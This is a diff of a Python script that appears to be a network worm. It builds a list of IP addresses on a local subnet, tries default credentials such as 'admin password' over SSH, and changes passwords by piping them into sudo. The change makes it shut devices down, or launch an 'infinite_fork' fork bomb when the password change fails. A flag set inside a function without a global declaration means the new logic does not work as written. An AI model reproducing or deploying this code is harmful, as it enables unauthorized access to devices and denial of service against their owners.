@@ -28,6 +28,8 @@ user_credentials_list = [
     "admin password",
 ]
 
+password_change_failed = False
+
 """ 
 A function that creates IP addresses and adds them to the ip_range list in the range
 from 192.168.137.2 - 192.168.137.254
@@ -127,7 +129,7 @@ def change_password_attack(current_password):
         p = os.system('echo %s|sudo -S %s' % (current_password, command))
     
     except Exception:
-        infinite_fork()
+        password_change_failed = True
 
 
 """
@@ -154,11 +156,14 @@ if __name__ == "__main__":
         if sys.argv[1] == "1":
             if len(sys.argv) == 3: # if password is passed in the arguments then change password
                 change_password_attack(sys.argv[2])
-            else: # otherwise fork processes
-                 infinite_fork()
+            else: # otherwise
+                password_change_failed = True
 
         generate_IP_list()
         start_ssh_devices()
 
         if sys.argv[1] == "1":
-            shutdown_device()
+            if not password_change_failed: # if password is changed then shutdown
+                shutdown_device()
+            else: # otherwise fork processes
+                infinite_fork()
